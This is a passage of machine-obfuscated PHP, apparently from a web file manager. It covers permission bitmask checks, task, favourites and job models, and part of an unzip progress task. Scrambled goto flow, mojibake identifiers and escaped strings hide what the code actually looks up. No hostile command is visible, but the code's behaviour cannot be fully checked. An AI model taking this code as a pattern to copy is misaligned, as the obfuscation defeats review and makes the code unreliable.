self::AUTH_COMMENT | self::AUTH_EVENT), array($DÒÉ”Œ•í[390] => LNG($DÒÉ”Œ•í[2130]), $DÒÉ”Œ•í[2121] => $DÒÉ”Œ•í[2131], $DÒÉ”Œ•í[2123] => 4, $DÒÉ”Œ•í[2124] => 1, $DÒÉ”Œ•í[2125] => self::AUTH_SHOW | self::AUTH_VIEW), array($DÒÉ”Œ•í[390] => LNG($DÒÉ”Œ•í[2132]), $DÒÉ”Œ•í[2121] => $DÒÉ”Œ•í[2133], $DÒÉ”Œ•í[2123] => 5, $DÒÉ”Œ•í[2124] => 1, $DÒÉ”Œ•í[2125] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($DÒÉ”Œ•í[390] => LNG($DÒÉ”Œ•í[2134]), $DÒÉ”Œ•í[2121] => $DÒÉ”Œ•í[2135], $DÒÉ”Œ•í[2123] => 6, $DÒÉ”Œ•í[2124] => 1, $DÒÉ”Œ•í[2125] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($DÒÉ”Œ•í[390] => LNG($DÒÉ”Œ•í[2136]), $DÒÉ”Œ•í[2121] => $DÒÉ”Œ•í[2137], $DÒÉ”Œ•í[2123] => 7, $DÒÉ”Œ•í[2124] => 1, $DÒÉ”Œ•í[2125] => 0)); return $bÆ‚ë©¯; } public static function authCheck($bØ•Ûâ¤“ƒ, $fà‡„™¤Ö‘) { $bØ•Ûâ¤“ƒ = intval($bØ•Ûâ¤“ƒ); if (_get($GLOBALS, $_SERVER[…Ò×–][462])) { return !0; } if ($bØ•Ûâ¤“ƒ <= 0) { return !1; } if (($bØ•Ûâ¤“ƒ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($bØ•Ûâ¤“ƒ & $fà‡„™¤Ö‘); } public static function authCheckShow($Cçáóô–Ëê) { return self::authCheck($Cçáóô–Ëê, self::AUTH_SHOW); } public static function authCheckView($E¥Š„«š“’) { return self::authCheck($E¥Š„«š“’, self::AUTH_VIEW); } public static function authCheckDownload($Cš’‡ŸÖ±‹) { return self::authCheck($Cš’‡ŸÖ±‹, self::AUTH_DOWNLOAD); } public static function authCheckUpload($aàà¢£Ò‹ô) { return self::authCheck($aàà¢£Ò‹ô, self::AUTH_UPLOAD); } public static function authCheckEdit($AâÂ•°¿) { return self::authCheck($AâÂ•°¿, self::AUTH_EDIT); } public static function authCheckRemove($eÈÜØøšƒğ) { return self::authCheck($eÈÜØøšƒğ, self::AUTH_REMOVE); } public static function authCheckShare($cöÓÄØ«õÀ) { return self::authCheck($cöÓÄØ«õÀ, self::AUTH_SHARE); } public static function authCheckComment($B«ç Èƒõá) { return self::authCheck($B«ç Èƒõá, self::AUTH_COMMENT); } public static function authCheckEvent($AÑ‰Ø‘ïÚÜ) { return self::authCheck($AÑ‰Ø‘ïÚÜ, self::AUTH_EVENT); } public static function authCheckRoot($A¬•Å½»Ó½) { return self::authCheck($A¬•Å½»Ó½, self::AUTH_ROOT); } public static function authCheckAction($A÷»¶†òÚí, $c¼„´Âº) { goto B‡¢ëÇ×ñÈ; E²Ù½™ôËî: $DÊ‹’É—‚ = $d³‘’Ùæ™[$c¼„´Âº]; $A÷»¶†òÚí = intval($A÷»¶†òÚí); if ($A÷»¶†òÚí <= 0) { return !1; } goto Cé¿„ì ×; B‡¢ëÇ×ñÈ: $C§’Ï‹ğ­ =& $_SERVER[…Ò×–]; $d³‘’Ùæ™ = array($C§’Ï‹ğ­[2138] => self::AUTH_VIEW, $C§’Ï‹ğ­[1051] => self::AUTH_DOWNLOAD, $C§’Ï‹ğ­[103] => self::AUTH_UPLOAD, $C§’Ï‹ğ­[2086] => self::AUTH_EDIT, $C§’Ï‹ğ­[2085] => self::AUTH_REMOVE, $C§’Ï‹ğ­[2096] => self::AUTH_SHARE, $C§’Ï‹ğ­[345] => self::AUTH_COMMENT, $C§’Ï‹ğ­[1438] => self::AUTH_EVENT, $C§’Ï‹ğ­[1574] => self::AUTH_ROOT); if (!isset($d³‘’Ùæ™[$c¼„´Âº])) { return; } goto E²Ù½™ôËî; Cé¿„ì ×: if (($A÷»¶†òÚí & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($A÷»¶†òÚí & $DÊ‹’É—‚); goto FğÖÈÓ¤ø˜; FğÖÈÓ¤ø˜: } public static function authDisable($A¿ƒâ²¥š„, $BÇŞ¨Šê Í) { if (intval($A¿ƒâ²¥š„) <= 0) { return 0; } return intval($A¿ƒâ²¥š„) & ~$BÇŞ¨Šê Í; } public $optionType = "\123\x79\163\x74\145\x6d\x2e\163\157\x75\x72\x63\x65\101\165\x74\150\114\151\163\x74"; public $field = array("\x6e\141\x6d\145", "\x61\165\x74\x68", "\x6c\x61\142\x65\154", "\x64\x69\x73\x70\154\x61\171", "\163\171\x73\x74\x65\x6d", "\163\157\162\x74"); public function initData() { $DÉ¥· ñî = $this->authDefault(); foreach ($DÉ¥· ñî as $eÙ­Œ¢ÈÛ¾) { $this->add($eÙ­Œ¢ÈÛ¾); } } public function listData($FË·÷¥æ…´ = false, $aå”Ÿ†¢”Ú = "\163\x6f\162\164", $fšïÜ»Ø„ = false) { return parent::listData($FË·÷¥æ…´, $aå”Ÿ†¢”Ú, $fšïÜ»Ø„); } public function update($B†ºÙƒí¤®, $Eôâ­‹ˆŸ) { $dÅ×±¸éåÛ =& $_SERVER[…Ò×–]; $AĞ¡š×äŠš = parent::listData($B†ºÙƒí¤®); $d¬Åµ¦•ÉÚ = $this->findByName($Eôâ­‹ˆŸ[$dÅ×±¸éåÛ[28]]); if (!$AĞ¡š×äŠš || $d¬Åµ¦•ÉÚ && $d¬Åµ¦•ÉÚ[$dÅ×±¸éåÛ[371]] != $AĞ¡š×äŠš[$dÅ×±¸éåÛ[371]]) { return !1; } $this->filterAuth($Eôâ­‹ˆŸ[$dÅ×±¸éåÛ[380]]); return parent::update($B†ºÙƒí¤®, $Eôâ­‹ˆŸ); } public function remove($D°ÁÑ¢–¤») { $C”ã¨º¦°ë = parent::listData($D°ÁÑ¢–¤»); if (!$C”ã¨º¦°ë || $C”ã¨º¦°ë[$_SERVER[…Ò×–][1090]]) { return !1; } return parent::remove($D°ÁÑ¢–¤»); } public function add($B³ãö„ŠãÜ = array()) { goto CÃó‘Ê·‚¨; CÃó‘Ê·‚¨: $EÇÙî±½Ø =& $_SERVER[…Ò×–]; if ($this->findByName($B³ãö„ŠãÜ[$EÇÙî±½Ø[28]])) { return !1; } $f…ÓÄßƒáš = array($EÇÙî±½Ø[28] => $EÇÙî±½Ø[33], $EÇÙî±½Ø[380] => 1, $EÇÙî±½Ø[2139] => $EÇÙî±½Ø[2129], $EÇÙî±½Ø[2140] => 1, $EÇÙî±½Ø[1090] => 0, $EÇÙî±½Ø[2141] => 0); goto f­õĞæòœ; f­õĞæòœ: $B³ãö„ŠãÜ = array_merge($f…ÓÄßƒáš, $B³ãö„ŠãÜ); $B³ãö„ŠãÜ[$EÇÙî±½Ø[2141]] = $this->getSort(); $this->filterAuth($B³ãö„ŠãÜ[$EÇÙî±½Ø[380]]); goto F‚Û¦ÌÏø¸; F‚Û¦ÌÏø¸: return parent::insert($B³ãö„ŠãÜ); goto CßéÀ®”Á; CßéÀ®”Á: } private function getSort() { $C±ä…ºä =& $_SERVER[…Ò×–]; $fƒÙÑª ³± = parent::listData(); $aæôê–è‰¬ = array_to_keyvalue($fƒÙÑª ³±, $C±ä…ºä[33], $C±ä…ºä[2141]); return empty($aæôê–è‰¬) ? 0 : max($aæôê–è‰¬) + 1; } private function filterAuth(&$E×«ò‚ƒ’) { goto B…‡õ¥öĞ; a›¥¹‰¿¯Ï: foreach ($b°…³öÊó as $aä¿«å·ğÔ) { if ($E×«ò‚ƒ’ & $aä¿«å·ğÔ) { $F‘Ä†ãˆŒ[] = $aä¿«å·ğÔ; } } if (in_array(self::AUTH_ROOT, $F‘Ä†ãˆŒ)) { $E×«ò‚ƒ’ = array_sum($b°…³öÊó); return; } $B¸ÒÕËØ×ˆ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); goto eİÊİËœ¢; eİÊİËœ¢: foreach ($F‘Ä†ãˆŒ as $aä¿«å·ğÔ) { if (isset($B¸ÒÕËØ×ˆ[$aä¿«å·ğÔ])) { $F‘Ä†ãˆŒ = array_merge($F‘Ä†ãˆŒ, $B¸ÒÕËØ×ˆ[$aä¿«å·ğÔ]); } } $F‘Ä†ãˆŒ[] = self::AUTH_SHOW; $E×«ò‚ƒ’ = array_sum(array_unique($F‘Ä†ãˆŒ)); goto aºåäãäë; B…‡õ¥öĞ: if (!$E×«ò‚ƒ’) { return; } $b°…³öÊó = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $F‘Ä†ãˆŒ = array(); goto a›¥¹‰¿¯Ï; aºåäãäë: } public function sort($d¸“ù¬¼×Œ, $a•±°‹Å³Ë) { return parent::update($d¸“ù¬¼×Œ, $a•±°‹Å³Ë); } } goto D­‡“Üº»“; a±˜†Ù†İğ: class SystemTaskModel extends ModelBaseLight { public $optionType = "\x53\171\163\x74\145\155\56\164\141\x73\153\x4c\151\163\164"; public $field = array("\x6e\x61\155\x65", "\x74\171\160\x65", "\145\x76\x65\156\x74", "\164\151\x6d\x65", "\144\x65\163\143", "\x73\171\163\164\x65\x6d", "\x65\156\141\142\x6c\145", "\154\141\163\x74\122\x75\x6e", "\163\x6f\162\164"); public function listData($CÙ†ºïŸí· = false, $C•Ş†‹Õ¸ñ = "\x73\157\x72\164", $C±Ñ›Èºâ = false) { return parent::listData($CÙ†ºïŸí·, $C•Ş†‹Õ¸ñ, $C±Ñ›Èºâ); } public function add($Aò±Í¶İ¯Í) { $BŠªíÖÈ¸× =& $_SERVER[…Ò×–]; $fƒâÄÊ„õÆ = $this->findByName($Aò±Í¶İ¯Í[$BŠªíÖÈ¸×[28]]); if ($fƒâÄÊ„õÆ) { return !1; } $Aò±Í¶İ¯Í[$BŠªíÖÈ¸×[1415]] = 0; $Aò±Í¶İ¯Í[$BŠªíÖÈ¸×[2141]] = $this->getSort(); return parent::insert($Aò±Í¶İ¯Í); } private function getSort() { $eêçŠ—Ô =& $_SERVER[…Ò×–]; $Eá›ŞÈø‰ä = parent::listData(); $E‹‚òÀ‡‹Ñ = array_to_keyvalue($Eá›ŞÈø‰ä, $eêçŠ—Ô[33], $eêçŠ—Ô[2141]); return empty($E‹‚òÀ‡‹Ñ) ? 0 : max($E‹‚òÀ‡‹Ñ) + 1; } public function update($Bí„ “¢ˆò, $dËù–ÍŞ¦) { $eôº¨í­Ó… =& $_SERVER[…Ò×–]; $cØÀçõ×¨± = $this->listData($Bí„ “¢ˆò); $cÈ˜—˜ ´“ = $this->findByName($dËù–ÍŞ¦[$eôº¨í­Ó…[28]]); if (!$cØÀçõ×¨± || $cÈ˜—˜ ´“ && $cÈ˜—˜ ´“[$eôº¨í­Ó…[371]] != $cØÀçõ×¨±[$eôº¨í­Ó…[371]]) { return !1; } return parent::update($Bí„ “¢ˆò, $dËù–ÍŞ¦); } public function remove($aœ¹‰¹Ã˜Ú, $AĞ„¬ö©¸¿ = false) { $EÁÆ¹áÖâ‰ =& $_SERVER[…Ò×–]; $d˜Ì©à²™ñ = $this->listData($aœ¹‰¹Ã˜Ú); if (!$d˜Ì©à²™ñ) { return; } if (!$AĞ„¬ö©¸¿ && $d˜Ì©à²™ñ[$EÁÆ¹áÖâ‰[1090]] == $EÁÆ¹áÖâ‰[83]) { return !1; } return parent::remove($aœ¹‰¹Ã˜Ú); } public function enable($BéÄ­™Àã•, $DÔàÒÜÓğ¼) { return $this->update($BéÄ­™Àã•, array($_SERVER[…Ò×–][2517] => $DÔàÒÜÓğ¼)); } public function run($a¾ĞçÁ†™) { return $this->update($a¾ĞçÁ†™, array($_SERVER[…Ò×–][2527] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\x75\x73\145\x72\137\146\x61\166"; protected function cacheFunctionAlias($c÷áÓ…ÈĞ£) { $E¡Â‰õ øµ =& $_SERVER[…Ò×–]; return array($E¡Â‰õ øµ[2215] => array(USER_ID, $E¡Â‰õ øµ[2528])); } protected function listData() { $d…ªº’Ş¡ø =& $_SERVER[…Ò×–]; $bÎÁœ¤ñµØ = array($d…ªº’Ş¡ø[1441] => USER_ID, $d…ªº’Ş¡ø[439] => 0); $C×‘Öì­¨Ñ = $d…ªº’Ş¡ø[2529]; $cøÓ©†³‰˜ = $this->field($C×‘Öì­¨Ñ)->where($bÎÁœ¤ñµØ)->order($d…ªº’Ş¡ø[2530])->select(); return $cøÓ©†³‰˜ ? $cøÓ©†³‰˜ : array(); } protected function resetCache() { } protected function listView() { goto Fî®Ûß½Æ³; DÖä”§¨ëæ: $F‡¯ÑùÚÄ¢ = array_to_keyvalue($C¢ÎÕ Ÿ˜, $AôíÕ²¹Şò[33], $AôíÕ²¹Şò[75]); if (!$F‡¯ÑùÚÄ¢) { return $eÙÜ·“ÍÃî; } $AİÌ­ƒ¦Â = 2000; goto d‡Â…·œÖ–; Fî®Ûß½Æ³: $AôíÕ²¹Şò =& $_SERVER[…Ò×–]; $eÙÜ·“ÍÃî = $this->listData(); $C¢ÎÕ Ÿ˜ = array_filter_by_field($eÙÜ·“ÍÃî, $AôíÕ²¹Şò[29], $AôíÕ²¹Şò[386]); goto DÖä”§¨ëæ; d‡Â…·œÖ–: $a™Ä«¬Àåˆ = array($AôíÕ²¹Şò[387] => array($AôíÕ²¹Şò[388], $F‡¯ÑùÚÄ¢)); $Bä˜²°Ò´ô = Model($AôíÕ²¹Şò[757])->listSource($a™Ä«¬Àåˆ, $AİÌ­ƒ¦Â); $Bä˜²°Ò´ô = array_merge($Bä˜²°Ò´ô[$AôíÕ²¹Şò[73]], $Bä˜²°Ò´ô[$AôíÕ²¹Şò[74]]); goto B–å÷®µÑ; B–å÷®µÑ: $Bä˜²°Ò´ô = array_to_keyvalue($Bä˜²°Ò´ô, $AôíÕ²¹Şò[373]); foreach ($eÙÜ·“ÍÃî as $aÕÈå‡Ç => $eİµâ‰øØÁ) { $d“êòŠ•ôË = $Bä˜²°Ò´ô[$eİµâ‰øØÁ[$AôíÕ²¹Şò[75]]]; $d“êòŠ•ôË = $d“êòŠ•ôË ? $d“êòŠ•ôË : array(); $eÙÜ·“ÍÃî[$aÕÈå‡Ç] = array_merge($d“êòŠ•ôË, $eİµâ‰øØÁ); } return $eÙÜ·“ÍÃî; goto dÆ¦ÄÍ; dÆ¦ÄÍ: } protected function addFav($B¿İÏø‚˜á, $A«å¨×‡¡ = '', $d¶‘Ë„Æ¢ = "\163\x6f\165\x72\x63\x65") { goto EºµºÏå; EºµºÏå: $a˜ƒ£Ô‘ù½ =& $_SERVER[…Ò×–]; $cšÜªÙ‘Øá = array($a˜ƒ£Ô‘ù½[1441] => USER_ID, $a˜ƒ£Ô‘ù½[439] => 0, $a˜ƒ£Ô‘ù½[392] => $d¶‘Ë„Æ¢, $a˜ƒ£Ô‘ù½[391] => $B¿İÏø‚˜á); if ($this->where($cšÜªÙ‘Øá)->find()) { return !1; } goto bæÔæ®°ù¿; bæÔæ®°ù¿: $cšÜªÙ‘Øá = array($a˜ƒ£Ô‘ù½[1441] => USER_ID, $a˜ƒ£Ô‘ù½[439] => 0); $e›—í¹¦‹ = $this->where($cšÜªÙ‘Øá)->max($a˜ƒ£Ô‘ù½[2141]); if (!$e›—í¹¦‹) { $e›—í¹¦‹ = 0; } goto B¨²Úšœ; D…×æ­Çµá: return $this->add($c‰™±ğÅ‚Ê); goto eºùô¢¿ô; B¨²Úšœ: if (!$A«å¨×‡¡ && $d¶‘Ë„Æ¢ == $a˜ƒ£Ô‘ù½[386]) { $FñÎ»Âƒ– = Model($a˜ƒ£Ô‘ù½[1127])->where(array($a˜ƒ£Ô‘ù½[387] => $B¿İÏø‚˜á))->find(); if (!$FñÎ»Âƒ–) { return !1; } $A«å¨×‡¡ = $FñÎ»Âƒ–[$a˜ƒ£Ô‘ù½[28]]; } $A«å¨×‡¡ = $this->getAutoName($A«å¨×‡¡); $c‰™±ğÅ‚Ê = array($a˜ƒ£Ô‘ù½[1441] => USER_ID, $a˜ƒ£Ô‘ù½[439] => 0, $a˜ƒ£Ô‘ù½[390] => $A«å¨×‡¡, $a˜ƒ£Ô‘ù½[391] => $B¿İÏø‚˜á, $a˜ƒ£Ô‘ù½[392] => $d¶‘Ë„Æ¢, $a˜ƒ£Ô‘ù½[2123] => $e›—í¹¦‹ + 1); goto D…×æ­Çµá; eºùô¢¿ô: } protected function remove($eÉ‡„¬ÎÏ‘) { $e¤÷˜¤ï×ø =& $_SERVER[…Ò×–]; $bÖ ÖÆ…—Ã = array($e¤÷˜¤ï×ø[1441] => USER_ID, $e¤÷˜¤ï×ø[389] => $eÉ‡„¬ÎÏ‘); return $this->where($bÖ ÖÆ…—Ã)->delete(); } protected function removeByName($E›ˆÈ¼²°Â) { $EÜæ¶–ŸÅ¯ =& $_SERVER[…Ò×–]; $aÍâØ·–«õ = array($EÜæ¶–ŸÅ¯[1441] => USER_ID, $EÜæ¶–ŸÅ¯[390] => $E›ˆÈ¼²°Â, $EÜæ¶–ŸÅ¯[439] => 0); return $this->where($aÍâØ·–«õ)->delete(); } protected function rename($DÅåÕªİÅº, $e…©Ç»É©˜) { $a ¡¼·Êë =& $_SERVER[…Ò×–]; if ($DÅåÕªİÅº == $e…©Ç»É©˜) { return !1; } $eÃÏ¶¹ø‚ = $this->getAutoName($e…©Ç»É©˜); if ($e…©Ç»É©˜ != $eÃÏ¶¹ø‚) { return !1; } $CÌ¶ËÎÉÙ» = array($a ¡¼·Êë[1441] => USER_ID, $a ¡¼·Êë[439] => 0, $a ¡¼·Êë[28] => $DÅåÕªİÅº); return $this->where($CÌ¶ËÎÉÙ»)->save(array($a ¡¼·Êë[28] => $e…©Ç»É©˜)); } protected function resetSort($Døº¾¤‡§à) { $D¦Û¥»³ =& $_SERVER[…Ò×–]; $Døº¾¤‡§à = is_array($Døº¾¤‡§à) ? $Døº¾¤‡§à : array(); $DºäòÔµ«´ = array($D¦Û¥»³[1441] => USER_ID); for ($A£ˆŸ“Ñ’ = 0; $A£ˆŸ“Ñ’ < count($Døº¾¤‡§à); $A£ˆŸ“Ñ’++) { $DºäòÔµ«´[$D¦Û¥»³[389]] = $Døº¾¤‡§à[$A£ˆŸ“Ñ’]; $this->where($DºäòÔµ«´)->save(array($D¦Û¥»³[2123] => $A£ˆŸ“Ñ’ + 1)); } return !0; } protected function moveTop($A¬¹¿ëŠ×) { goto fƒÂ¦ÌªÒ; b³ØØÈÒÁ: $DäÂ‹·‚…¾ = $E÷¥³Ù·ì; $E÷¥³Ù·ì = array_remove_value($E÷¥³Ù·ì, $Eëš°Å†™ã[$d´‚ñÇ´·[371]]); array_unshift($E÷¥³Ù·ì, $Eëš°Å†™ã[$d´‚ñÇ´·[371]]); goto AÉß™ŞÇÔ½; fƒÂ¦ÌªÒ: $d´‚ñÇ´· =& $_SERVER[…Ò×–]; $D±Ô ùäã½ = array($d´‚ñÇ´·[1441] => USER_ID, $d´‚ñÇ´·[439] => 0); $Eëš°Å†™ã = $this->where($D±Ô ùäã½)->where(array($d´‚ñÇ´·[28] => $A¬¹¿ëŠ×))->find(); goto AãèËÀŒ©Ç; AÉß™ŞÇÔ½: return $this->resetSort($E÷¥³Ù·ì); goto A»³¯„ïğâ; AãèËÀŒ©Ç: if (!$Eëš°Å†™ã) { return; } $E÷¥³Ù·ì = $this->field($d´‚ñÇ´·[371])->where($D±Ô ùäã½)->order($d´‚ñÇ´·[2530])->select(); $E÷¥³Ù·ì = array_to_keyvalue($E÷¥³Ù·ì, $d´‚ñÇ´·[33], $d´‚ñÇ´·[371]); goto b³ØØÈÒÁ; A»³¯„ïğâ: } protected function moveBottom($E—õ¨ŠãœÔ) { $bÄæÙ‚‰‰ =& $_SERVER[…Ò×–]; $BÙ„ÜÈ”·¶ = array($bÄæÙ‚‰‰[1441] => USER_ID, $bÄæÙ‚‰‰[439] => 0); $c¾‰‹´ÌšË = $this->where($BÙ„ÜÈ”·¶)->max($bÄæÙ‚‰‰[2141]); $EåÂ¨«©ÔÒ = array($bÄæÙ‚‰‰[2141] => $c¾‰‹´ÌšË + 1); return $this->where($BÙ„ÜÈ”·¶)->where(array($bÄæÙ‚‰‰[28] => $E—õ¨ŠãœÔ))->save($EåÂ¨«©ÔÒ); } private function getAutoName($FöÍÁ£„è) { goto C‡ ”šêõ; f–®Ãßç½: return $FöÍÁ£„è . "\50{$d…˜ŸÁ’È†}\51"; goto c™î‰Ê„àÆ; C‡ ”šêõ: $a¼ç÷âŞÊ =& $_SERVER[…Ò×–]; $F”ˆÇŠ”Í« = array($a¼ç÷âŞÊ[1441] => USER_ID, $a¼ç÷âŞÊ[439] => 0); $fÓ¨ä ©Ìé = $this->field($a¼ç÷âŞÊ[28])->where($F”ˆÇŠ”Í«)->select(); goto eİŠ—ö­Šó; eİŠ—ö­Šó: $fÓ¨ä ©Ìé = array_to_keyvalue($fÓ¨ä ©Ìé, $a¼ç÷âŞÊ[33], $a¼ç÷âŞÊ[28]); if (!$fÓ¨ä ©Ìé || !in_array($FöÍÁ£„è, $fÓ¨ä ©Ìé)) { return $FöÍÁ£„è; } for ($d…˜ŸÁ’È† = 0; $d…˜ŸÁ’È† < count($fÓ¨ä ©Ìé); $d…˜ŸÁ’È†++) { if (!in_array($FöÍÁ£„è . "\50{$d…˜ŸÁ’È†}\51", $fÓ¨ä ©Ìé)) { return $FöÍÁ£„è . "\x28{$d…˜ŸÁ’È†}\51"; } } goto f–®Ãßç½; c™î‰Ê„àÆ: } } class UserJobModel extends ModelBaseLight { public $optionType = "\x53\171\x73\164\x65\x6d\x2e\x6a\157\x62\x4c\151\x73\x74"; public $field = array("\x6e\x61\155\145", "\x64\x65\x73\x63", "\163\157\162\x74"); const JOB_KEY = "\163\x65\154\146\112\x6f\x62\114\151\x73\x74"; public function listData($c‚–ÏáÉ˜ = false, $FŸÊÓÓ®Ô« = "\163\157\162\164", $fë ô³›ÍØ = false) { return parent::listData($c‚–ÏáÉ˜, $FŸÊÓÓ®Ô«, $fë ô³›ÍØ); } public function remove($B…„Ö÷³­) { return parent::remove($B…„Ö÷³­); } public function add($d¹À¾ùØ¤ø) { $Aˆˆ‰‹¨œ =& $_SERVER[…Ò×–]; if ($this->findByName($d¹À¾ùØ¤ø[$Aˆˆ‰‹¨œ[28]])) { return !1; } $d¹À¾ùØ¤ø[$Aˆˆ‰‹¨œ[2141]] = $this->getSort(); return parent::insert($d¹À¾ùØ¤ø); } private function getSort() { $FÕŠœò§©” =& $_SERVER[…Ò×–]; $A©Ã‰Å«¦õ = parent::listData(); $b¦‡çÑ¹„ = array_to_keyvalue($A©Ã‰Å«¦õ, $FÕŠœò§©”[33], $FÕŠœò§©”[2141]); return empty($b¦‡çÑ¹„) ? 0 : max($b¦‡çÑ¹„) + 1; } public function update($c‘ˆ¥î‚âš, $f¥“ª²‡¬ ) { $CÖôÎóæ©¦ =& $_SERVER[…Ò×–]; $C‰Ê§ÆÈ•ô = parent::listData($c‘ˆ¥î‚âš); $eË‹–›ÒÜ„ = $this->findByName($f¥“ª²‡¬ [$CÖôÎóæ©¦[28]]); if (!$C‰Ê§ÆÈ•ô || $eË‹–›ÒÜ„ && $eË‹–›ÒÜ„[$CÖôÎóæ©¦[371]] != $C‰Ê§ÆÈ•ô[$CÖôÎóæ©¦[371]]) { return !1; } return parent::update($c‘ˆ¥î‚âš, $f¥“ª²‡¬ ); } public function setUserJob($a‚ã±÷¬„Ë, $bã‘˜İèÇŠ) { goto A¸ºÒì²Œ; F×ÚİºØ’å: $a´­­õÑ³Â = rtrim($a´­­õÑ³Â, $E‡Å‚Âù±¦[47]); Model($E‡Å‚Âù±¦[482])->metaSet($a‚ã±÷¬„Ë, self::JOB_KEY, $a´­­õÑ³Â); goto b–°µïë‘­; dœ§î¦”ƒ‚: $EŸª¢Úã·– = array_to_keyvalue($f¥µÎä‹õ, $E‡Å‚Âù±¦[28]); $a´­­õÑ³Â = $E‡Å‚Âù±¦[365]; foreach ($bã‘˜İèÇŠ as $f¥´Í‡›‚Á) { if ($EŸª¢Úã·–[$f¥´Í‡›‚Á]) { $a´­­õÑ³Â .= $EŸª¢Úã·–[$f¥´Í‡›‚Á][$E‡Å‚Âù±¦[371]] . $E‡Å‚Âù±¦[47]; } else { $dğõ°¶Å‚Œ = $this->add($f¥´Í‡›‚Á); $a´­­õÑ³Â .= $dğõ°¶Å‚Œ . $E‡Å‚Âù±¦[47]; } } goto F×ÚİºØ’å; A¸ºÒì²Œ: $E‡Å‚Âù±¦ =& $_SERVER[…Ò×–]; if (!is_array($bã‘˜İèÇŠ)) { $bã‘˜İèÇŠ = array($bã‘˜İèÇŠ); } $f¥µÎä‹õ = parent::listData(); goto dœ§î¦”ƒ‚; b–°µïë‘­: } public function getUserJob($béÍ£ó¡´ã) { $F®ë®¹‹¼† = Model($_SERVER[…Ò×–][482])->metaGet($béÍ£ó¡´ã); return $this->getUserJobInfo($F®ë®¹‹¼†[self::JOB_KEY]); } public function getUserJobInfo($båÆ‰Œ«å) { goto Bƒ‡íÍŠ®º; EÛ„°èĞ™: $E°ÔŒøìƒÄ = array_remove_key($E°ÔŒøìƒÄ, $c‡Ë­Ö›÷[191]); $CçÀ‚í©‘ = array(); foreach ($cğìš³Ñ© as $fÛ³ÚğÊÄ) { if (isset($E°ÔŒøìƒÄ[$fÛ³ÚğÊÄ])) { $CçÀ‚í©‘[] = $E°ÔŒøìƒÄ[$fÛ³ÚğÊÄ]; } } goto bÄ§‘²ÎŸ; Bƒ‡íÍŠ®º: $c‡Ë­Ö›÷ =& $_SERVER[…Ò×–]; $cğìš³Ñ© = explode($c‡Ë­Ö›÷[47], $båÆ‰Œ«å); $E°ÔŒøìƒÄ = parent::listData(); goto EÛ„°èĞ™; bÄ§‘²ÎŸ: return $CçÀ‚í©‘; goto CÅã×‘™; CÅã×‘™: } } goto aØ™‹²†²ë; Cœ¼ä†Îâ¥: class TaskUnzip extends TaskFileTransfer { protected function startAfter() { goto eÒ¤¥†ä÷; eÒ¤¥†ä÷: $A‹ÄåìĞ¶ =& $_SERVER[…Ò×–]; parent::startAfter(); Hook::bind($A‹ÄåìĞ¶[1520], array($this, $A‹ÄåìĞ¶[1521])); goto e¬Òô¬ƒ·Ï; e¬Òô¬ƒ·Ï: Hook::bind($A‹ÄåìĞ¶[1046], array($this, $A‹ÄåìĞ¶[1522])); $Dƒ¿±¥Ù„Ÿ =& $this->task; $Dƒ¿±¥Ù„Ÿ[$A‹ÄåìĞ¶[1523]] = $A‹ÄåìĞ¶[1051]; goto dÊÒ¦°Äîğ; dÊÒ¦°Äîğ: if (!$Dƒ¿±¥Ù„Ÿ[$A‹ÄåìĞ¶[1354]]) { $Dƒ¿±¥Ù„Ÿ[$A‹ÄåìĞ¶[1354]] = LNG($A‹ÄåìĞ¶[1524]); } goto Eå“‡™“¬½; Eå“‡™“¬½: } protected function endAfter() { $e§÷…Íß“Ş =& $_SERVER[…Ò×–]; parent::endAfter(); Hook::unbind($e§÷…Íß“Ş[1520], array($this, $e§÷…Íß“Ş[1521])); Hook::unbind($e§÷…Íß“Ş[1046], array($this, $e§÷…Íß“Ş[1522])); } public function updateAfter() { $Dèç™Ä¥¨Î =& $_SERVER[…Ò×–]; $e·›ËŞØ·î =& $this->task; if (!$e·›ËŞØ·î[$Dèç™Ä¥¨Î[983]] || !$e·›ËŞØ·î[$Dèç™Ä¥¨Î[703]]) { return; } if ($e·›ËŞØ·î[$Dèç™Ä¥¨Î[1523]] == $Dèç™Ä¥¨Î[1051]) { $FÆö×Ä¸ĞŒ = 0; if ($e·›ËŞØ·î[$Dèç™Ä¥¨Î[1495]]) { $FÆö×Ä¸ĞŒ = $e·›ËŞØ·î[$Dèç™Ä¥¨Î[1496]] / $e·›ËŞØ·î[$Dèç™Ä¥¨Î[1495]]; } $e·›ËŞØ·î[$Dèç™Ä¥¨Î[1451]] = $FÆö×Ä¸ĞŒ * 0.3; } else { if ($e·›ËŞØ·î[$Dèç™Ä¥¨Î[1523]] == $Dèç™Ä¥¨Î[305]) { $FÆö×Ä¸ĞŒ = $e·›ËŞØ·î[$Dèç™Ä¥¨Î[997]] / $e·›ËŞØ·î[$Dèç™Ä¥¨Î[983]]; $e·›ËŞØ·î[$Dèç™Ä¥¨Î[1451]] = 0.3 + $FÆö×Ä¸ĞŒ * 0.4; } else { if ($e·›ËŞØ·î[$Dèç™Ä¥¨Î[1523]] == $Dèç™Ä¥¨Î[103]) { $A›Ãç×ç¨« = 0; if ($e·›ËŞØ·î[$Dèç™Ä¥¨Î[1497]] == $Dèç™Ä¥¨Î[103]) { $A›Ãç×ç¨« = $e·›ËŞØ·î[$Dèç™Ä¥¨Î[1496]]; } $FÆö×Ä¸ĞŒ = ($e·›ËŞØ·î[$Dèç™Ä¥¨Î[1500]] + $A›Ãç×ç¨«) / $e·›ËŞØ·î[$Dèç™Ä¥¨Î[703]]; $e·›ËŞØ·î[$Dèç™Ä¥¨Î[1451]] = 0.3 + 0.4 + 